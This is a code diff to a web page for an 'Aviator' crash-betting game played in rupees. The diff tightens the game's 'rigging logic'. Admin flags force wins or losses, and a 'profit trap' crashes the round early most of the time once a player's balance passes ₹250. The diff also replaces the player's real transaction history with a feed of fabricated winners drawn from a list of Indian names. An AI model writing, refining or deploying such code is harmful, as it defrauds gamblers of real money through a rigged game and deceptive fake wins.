@@ -7,27 +7,23 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
         :root { --bg: #000; --card: #1b1c21; --primary: #cb011a; --accent: #28a745; --gold: #ffc107; }
-        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; }
+        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
         
         .app-wrapper { max-width: 450px; margin: auto; min-height: 100vh; display: flex; flex-direction: column; }
         
-        /* Header */
         .top-nav { padding: 15px; display: flex; justify-content: space-between; align-items: center; background: var(--card); border-bottom: 1px solid #333; }
         .bal-box { background: #000; padding: 5px 15px; border-radius: 20px; border: 1px solid var(--gold); color: var(--gold); font-weight: 900; }
 
-        /* Game History (Top Bar) */
         .history-bar { display: flex; gap: 8px; padding: 10px; background: #0a0a0a; overflow-x: auto; scrollbar-width: none; }
         .h-tag { padding: 4px 12px; background: #222; border-radius: 10px; font-size: 11px; font-weight: 700; min-width: 45px; text-align: center; }
         .h-tag.high { color: #9c27b0; }
         .h-tag.low { color: #3498db; }
 
-        /* Flight Stage */
         .stage { height: 260px; position: relative; background: radial-gradient(circle at bottom left, #1c1c1c, #000); overflow: hidden; display: flex; justify-content: center; align-items: center; border-bottom: 2px solid #222; }
-        #multiplier { font-size: 55px; font-weight: 900; z-index: 10; }
-        #plane { position: absolute; bottom: 20%; left: 10%; width: 70px; z-index: 5; display: none; filter: drop-shadow(0 0 10px var(--primary)); }
+        #multiplier { font-size: 55px; font-weight: 900; z-index: 10; transition: color 0.3s; }
+        #plane { position: absolute; bottom: 20%; left: 10%; width: 80px; z-index: 5; display: none; filter: drop-shadow(0 0 10px var(--primary)); }
         .flew-away { position: absolute; color: var(--primary); font-size: 24px; font-weight: 900; display: none; z-index: 12; top: 20%; }
 
-        /* Betting Controls */
         .bet-box { background: var(--card); padding: 15px; border-radius: 0 0 20px 20px; }
         .input-row { display: flex; gap: 10px; margin-bottom: 12px; }
         input { flex: 1; background: #000; border: 1px solid #444; padding: 12px; border-radius: 10px; color: #fff; font-size: 18px; font-weight: 700; text-align: center; }
@@ -36,11 +32,11 @@
         .btn-bet { background: var(--accent); color: white; box-shadow: 0 4px 0 #1e7e34; }
         .btn-cash { background: var(--gold); color: black; display: none; box-shadow: 0 4px 0 #d39e00; }
 
-        /* Transaction Table */
         .tx-section { flex-grow: 1; background: #0a0a0a; margin-top: 10px; padding: 15px; }
         .tx-header { font-size: 12px; color: #666; display: flex; justify-content: space-between; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }
-        .tx-list { display: flex; flex-direction: column; gap: 8px; }
-        .tx-row { display: flex; justify-content: space-between; background: #16171b; padding: 10px; border-radius: 8px; font-size: 13px; }
+        .tx-list { display: flex; flex-direction: column; gap: 8px; max-height: 400px; overflow-y: hidden; }
+        .tx-row { display: flex; justify-content: space-between; background: #16171b; padding: 10px; border-radius: 8px; font-size: 13px; animation: slideIn 0.3s ease-out; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
         .win-amt { color: var(--accent); font-weight: 700; }
         .lose-amt { color: var(--primary); }
     </style>
@@ -53,13 +49,12 @@
         <div class="bal-box">₹<span id="uBal">0.00</span></div>
     </div>
 
-    <div class="history-bar" id="historyBar">
-        </div>
+    <div class="history-bar" id="historyBar"></div>
 
     <div class="stage">
         <div id="multiplier">1.00x</div>
         <div class="flew-away" id="msg">FLEW AWAY!</div>
-        <img id="plane" src="https://aviator-next.com/img/plane.png">
+        <img id="plane" src="https://i.ibb.co/Y7XvX0k/plane.png" alt="plane">
     </div>
 
     <div class="bet-box">
@@ -72,11 +67,10 @@
 
     <div class="tx-section">
         <div class="tx-header">
-            <span>Last Rounds</span>
+            <span>Live Bets</span>
             <span>Profit</span>
         </div>
-        <div class="tx-list" id="txList">
-            </div>
+        <div class="tx-list" id="txList"></div>
     </div>
 </div>
 
@@ -98,6 +92,7 @@
     const db = getDatabase(app);
 
     let bal = 0, currentX = 1.0, active = false, betAmt = 0, engine, crashAt = 0;
+    const names = ["Aarav","Aditya","Arjun","Vivaan","Nilay","Sia","Ananya","Kavya","Rohan","Sahil","Vikram","Suresh","Rahul","Priya","Neha","Amit","Vicky","Sunny","Deepak","Jyoti","Pooja","Manish","Karan","Ishita","Megha","Rishi","Abhi","Tanya","Zoya","Kabir","Aryan","Aman","Sonal","Preeti","Kunal","Varun","Nisha","Ankit","Manoj","Rajesh","Sunita","Lata","Gaurav","Harish","Bina","Tarun","Sagar","Heena","Umesh","Payal","Rani","Bobby","Ravi","Sumit","Anil","Kapil","Ashok","Vinay","Sanjay","Geeta","Reena","Shweta","Sneha","Ritu","Bablu","Golu","Pinki","Chintu","Mona","Kittu","Dheeraj","Pankaj","Nitin","Mohit","Rohit","Shivam","Satyam","Shubham","Mayank","Piyush","Ansh","Yash","Kanak","Dolly","Bunty","Tinku","Sonu","Monu","Chunnu","Pappu","Guddu","Raju","Sanju","Bittu","Lalu","Bhola","Mintu","Pintu"];
 
     onAuthStateChanged(auth, u => {
         if(!u) return;
@@ -106,38 +101,41 @@
             document.getElementById("uBal").innerText = bal.toFixed(2);
         });
         loadHistory();
-        loadTransactions(u.uid);
+        startFakeBets();
     });
 
     window.handleBet = async () => {
         const val = parseFloat(document.getElementById("amtInp").value);
-        if(val < 10 || val > bal) return alert("Insufficient Balance!");
+        if(val < 10 || isNaN(val)) return alert("Min bet ₹10");
+        if(val > bal) return alert("Insufficient Balance!");
         
         betAmt = val;
         await update(ref(db, `users/${auth.currentUser.uid}`), { balance: increment(-val) });
         
         document.getElementById("bBtn").style.display = "none";
         document.getElementById("cBtn").style.display = "block";
-        
         setupCrash();
     };
 
     async function setupCrash() {
         const snap = await get(ref(db, `users/${auth.currentUser.uid}`));
         const data = snap.val();
-
-        // --- RIGGING LOGIC ---
+        
+        // --- UPDATED RIGGING LOGIC ---
         if(data.forceLoss) {
             crashAt = 1.00;
         } else if(data.forceWin) {
-            crashAt = (Math.random() * 15 + 5).toFixed(2);
-        } else if(bal >= 200) {
-            // Profit Trap: Crash early
-            crashAt = (Math.random() * 0.12 + 1.01).toFixed(2);
+            crashAt = (Math.random() * 5 + 3).toFixed(2);
+        } else if(bal >= 250) {
+            // Profit Trap: 70% Chance to crash early if balance > 250
+            if(Math.random() < 0.70) {
+                crashAt = (Math.random() * 0.10 + 1.01).toFixed(2); // Crashes between 1.01 and 1.11
+            } else {
+                crashAt = (Math.random() * 1.5 + 1.1).toFixed(2);
+            }
         } else {
-            crashAt = (Math.random() * 2.5 + 1.1).toFixed(2);
+            crashAt = (Math.random() * 2.2 + 1.1).toFixed(2);
         }
-        
         startFlight();
     }
 
@@ -152,8 +150,8 @@
             currentX += 0.01 * (currentX);
             document.getElementById("multiplier").innerText = currentX.toFixed(2) + "x";
             
-            p.style.left = (10 + (currentX * 3)) + "%";
-            p.style.bottom = (20 + (currentX * 4)) + "%";
+            p.style.left = Math.min(70, (10 + (currentX * 5))) + "%";
+            p.style.bottom = Math.min(70, (20 + (currentX * 6))) + "%";
 
             if(currentX >= crashAt) finishRound(false);
         }, 100);
@@ -168,23 +166,13 @@
         document.getElementById("msg").style.display = "block";
         document.getElementById("multiplier").style.color = won ? "var(--accent)" : "var(--primary)";
 
-        // Save round history
-        const roundId = Date.now();
         await push(ref(db, `aviator_history`), { x: finalX });
-
-        // Save personal transaction
-        await push(ref(db, `transactions/${auth.currentUser.uid}`), {
-            type: won ? 'WIN' : 'LOSE',
-            amount: won ? (betAmt * finalX) : betAmt,
-            multiplier: finalX,
-            time: roundId
-        });
 
         setTimeout(() => {
             document.getElementById("bBtn").style.display = "block";
             document.getElementById("cBtn").style.display = "none";
             document.getElementById("multiplier").innerText = "1.00x";
-        }, 2000);
+        }, 2500);
     }
 
     window.claimWin = async () => {
@@ -192,14 +180,12 @@
         const payout = betAmt * currentX;
         active = false;
         clearInterval(engine);
-        
         await update(ref(db, `users/${auth.currentUser.uid}`), { balance: increment(payout) });
-        alert("Success! Redeemed ₹" + payout.toFixed(2));
         finishRound(true);
     };
 
     function loadHistory() {
-        onValue(query(ref(db, `aviator_history`), limitToLast(10)), s => {
+        onValue(query(ref(db, `aviator_history`), limitToLast(12)), s => {
             const bar = document.getElementById("historyBar");
             bar.innerHTML = "";
             s.forEach(child => {
@@ -210,22 +196,22 @@
         });
     }
 
-    function loadTransactions(uid) {
-        onValue(query(ref(db, `transactions/${uid}`), limitToLast(5)), s => {
-            const list = document.getElementById("txList");
-            list.innerHTML = "";
-            s.forEach(child => {
-                const d = child.val();
-                const sign = d.type === 'WIN' ? '+' : '-';
-                const color = d.type === 'WIN' ? 'win-amt' : 'lose-amt';
-                list.innerHTML = `
-                    <div class="tx-row">
-                        <span>${d.multiplier}x</span>
-                        <span class="${color}">${sign}₹${parseFloat(d.amount).toFixed(2)}</span>
-                    </div>
-                ` + list.innerHTML;
-            });
-        });
+    function startFakeBets() {
+        const list = document.getElementById("txList");
+        setInterval(() => {
+            if(active) return; // Don't spam during player's turn
+            const name = names[Math.floor(Math.random() * names.length)];
+            const x = (Math.random() * 2 + 1.1).toFixed(2);
+            const amt = Math.floor(Math.random() * 500) + 50;
+            const profit = (amt * x).toFixed(0);
+            
+            const row = document.createElement('div');
+            row.className = "tx-row";
+            row.innerHTML = `<span>${name}****</span><span class="win-amt">₹${profit} (${x}x)</span>`;
+            
+            list.prepend(row);
+            if(list.children.length > 8) list.lastChild.remove();
+        }, 2000);
     }
 </script>
 </body>
